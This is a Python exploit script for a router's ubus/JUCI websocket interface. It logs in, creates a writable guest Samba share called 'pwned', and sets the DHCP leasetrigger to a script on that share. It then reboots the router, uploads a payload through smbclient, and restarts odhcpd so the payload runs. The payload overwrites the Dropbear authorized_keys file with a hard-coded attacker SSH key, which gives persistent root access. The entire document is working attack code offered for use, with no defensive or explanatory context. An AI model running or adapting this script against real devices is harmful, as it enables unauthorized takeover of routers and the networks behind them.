#!/usr/bin/python

import json
import sys
import subprocess
import socket
import os
from time import sleep
from websocket import create_connection

def ubusAuth(host, username, password):
    ws = create_connection("ws://" + host, header = ["Sec-WebSocket-Protocol: ubus-json"])
    req = json.dumps({"jsonrpc":"2.0","method":"call",
        "params":["00000000000000000000000000000000","session","login",
        {"username": username,"password":password}],
        "id":666})
    ws.send(req)
    response =  json.loads(ws.recv())
    ws.close()
    try:
        key = response.get('result')[1].get('ubus_rpc_session')
    except IndexError:
        return(None)
    return(key)

def ubusCall(host, key, namespace, argument, params={}):
    ws = create_connection("ws://" + host, header = ["Sec-WebSocket-Protocol: ubus-json"])
    req = json.dumps({"jsonrpc":"2.0","method":"call",
        "params":[key,namespace,argument,params],
        "id":666})
    ws.send(req)
    response =  json.loads(ws.recv())
    ws.close()
    try:
        result = response.get('result')[1]
    except IndexError:
        if response.get('result')[0] == 0:
            return(True)
        return(None)
    return(result)

if __name__ == "__main__":
    host = "192.168.1.1"
    payload = """
#!/bin/sh
/bin/echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAkQMU/2HyXNEJ8gZbkxrvLnpSZ4Xz+Wf3QhxXdQ5blDI5IvDkoS4jHoi5XKYHevz8YiaX8UYC7cOBrJ1udp/YcuC4GWVV5TET449OsHBD64tgOSV+3s5r/AJrT8zefJbdc13Fx/Bnk+bovwNS2OTkT/IqYgy9n+fKKkSCjQVMdTTrRZQC0RpZ/JGsv2SeDf/iHRa71keIEpO69VZqPjPVFQfj1QWOHdbTRQwbv0MJm5rt8WTKtS4XxlotF+E6Wip1hbB/e+y64GJEUzOjT6BGooMu/FELCvIs2Nhp25ziRrfaLKQY1XzXWaLo4aPvVq05GStHmTxb+r+WiXvaRv1cbQ== rsa-key-20170427" > /etc/dropbear/authorized_keys
/usr/sbin/odhcpd-update
exit 0
    """

    print("Authenticating...")
    key = ubusAuth(host, "user", "password")
    if (not key):
        print("Auth failed!")
        sys.exit(1)
    print("Got key: %s" % key)

    print("Adding Samba share...")
    smbcheck = json.dumps(ubusCall(host, key, "uci", "get",
        {"config":"samba"}))
    if ("pwned" in smbcheck):
        print("Samba share seems to already exist, skipping")
    else:
        smba = ubusCall(host, key, "uci", "add",
            {"config":"samba", "type":"sambashare", "values":
            {"name":"pwned", "read_only":"no", "create_mask":"0775", "dir_mask":"0775",
            "path":"/mnt/", "guest_ok":"yes"}})
        if (not smba):
            print("Adding Samba share failed!")
            sys.exit(1)

    print("Enabling Samba...")
    smbe = ubusCall(host, key, "uci", "set",
        {"config":"samba", "type":"samba", "values":
        {"interface":"lan"}})
    if (not smbe):
        print("Enabling Samba failed!")
        sys.exit(1)

    print("Committing changes...")
    smbc = ubusCall(host, key, "uci", "commit",
        {"config":"samba"})
    if (not smbc):
        print("Committing changes failed!")
        sys.exit(1)

    print("Setting malicious leasetrigger...")
    lts = ubusCall(host, key, "uci", "set",
        {"config":"dhcp", "type":"odhcpd", "values":
        {"leasetrigger":"/mnt/pwn.sh"}})
    if (not lts):
        print("Setting leasetrigger failed!")
        sys.exit(1)

    print("Committing changes...")
    ltc = ubusCall(host, key, "uci", "commit",
        {"config":"dhcp"})
    if (not ltc):
        print("Committing changes failed!")
        sys.exit(1)

    print("Rebooting system...")
    reb = ubusCall(host, key, "juci.system", "reboot")
    if (not reb):
        print("Rebooting failed, try rebooting manually!")
        sys.exit(1)

    print("Waiting on reboot...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    isUp = None
    while (not isUp):
        try:
            sleep(10)
            s.connect((host, 8080))
            isUp = True
            s.close()
        except:
            pass

    print("Creating temp file for payload...")
    with open(".payload.tmp","a+") as file:
        file.write(payload)
        path = os.path.realpath(file.name)

    print("Dropping payload...")
    subprocess.run(r"smbclient \\\\%s\\pwned p -c 'put %s pwn.sh'" % (host, path),
        shell=True, check=True)
    print("Payload dropped")

    print("Authenticating...")
    key = ubusAuth(host, "user", "password")
    if (not key):
        print("Auth failed!")
        sys.exit(1)
    print("Got key: %s" % key)

    print("Executing payload")
    eec = ubusCall(host, key, "juci.service", "stop",
        {"name":"odhcpd"})
    if (not eec):
        print("Stopping odhcpd failed!")
        sys.exit(1)
    ees = ubusCall(host, key, "juci.service", "start",
        {"name":"odhcpd"})
    if (not ees):
        print("Starting odhcpd failed!")
        sys.exit(1)

    print("Cleaning up...")
    os.remove(path)

    print("Exploitation complete")